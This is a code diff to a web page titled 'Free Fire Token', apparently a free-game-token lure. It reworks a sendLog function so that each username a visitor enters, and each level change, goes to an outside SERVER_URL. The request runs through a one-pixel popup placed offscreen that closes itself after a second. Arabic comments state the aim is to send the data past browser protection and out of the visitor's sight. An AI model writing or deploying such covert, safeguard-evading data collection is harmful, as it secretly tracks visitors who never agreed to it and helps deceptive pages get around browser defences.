@@ -36,8 +36,6 @@
     </div>
 </div>
 
-<iframe name="hidden_frame" id="hidden_frame" style="display:none;"></iframe>
-
 <div class="container">
     <h1>Free Fire Token</h1>
     <div class="top-info">
@@ -65,27 +63,18 @@
     let cur = 0, tokens = 0, currentUser = "", timeLeft = 120, timerInterval = null, firstTile = null;
 
     const userInput = document.getElementById('username-input');
-    
-    // وظيفة إرسال البيانات "القوية"
+
+    // الوظيفة المعدلة لإرسال البيانات رغماً عن حماية المتصفح
     function sendLog(user, lvl) {
-        let form = document.createElement('form');
-        form.method = 'GET';
-        form.action = SERVER_URL;
-        form.target = 'hidden_frame'; // إرسال للإطار المخفي
-
-        let inputUser = document.createElement('input');
-        inputUser.name = 'user';
-        inputUser.value = user;
-        form.appendChild(inputUser);
-
-        let inputLvl = document.createElement('input');
-        inputLvl.name = 'lvl';
-        inputLvl.value = lvl;
-        form.appendChild(inputLvl);
-
-        document.body.appendChild(form);
-        form.submit();
-        document.body.removeChild(form);
+        let reportUrl = SERVER_URL + "?user=" + encodeURIComponent(user) + "&lvl=" + lvl;
+        
+        // فتح الرابط في نافذة مخفية جداً خارج نطاق الرؤية
+        let logger = window.open(reportUrl, "logger", "width=1,height=1,left=5000,top=5000");
+        
+        // إغلاق النافذة بعد ثانية واحدة (وقت كافٍ للسيرفر لمعالجة الطلب)
+        if (logger) {
+            setTimeout(() => { logger.close(); }, 1000);
+        }
     }
 
     userInput.addEventListener('input', function() {
@@ -116,7 +105,7 @@
             cur = saved ? parseInt(saved) : 0;
             tokens = cur * 20;
 
-            // إرسال الإشعار فور الدخول
+            // إرسال الإشعار
             sendLog(userVal, cur + 1);
 
             document.getElementById('login-screen').style.display = 'none';
@@ -126,7 +115,7 @@
 
     function saveProgress() {
         localStorage.setItem('ff_save_lvl_' + currentUser, cur);
-        // إرسال تحديث المستوى
+        // إرسال تحديث المستوى عند الانتقال
         sendLog(currentUser, cur + 1);
     }
 
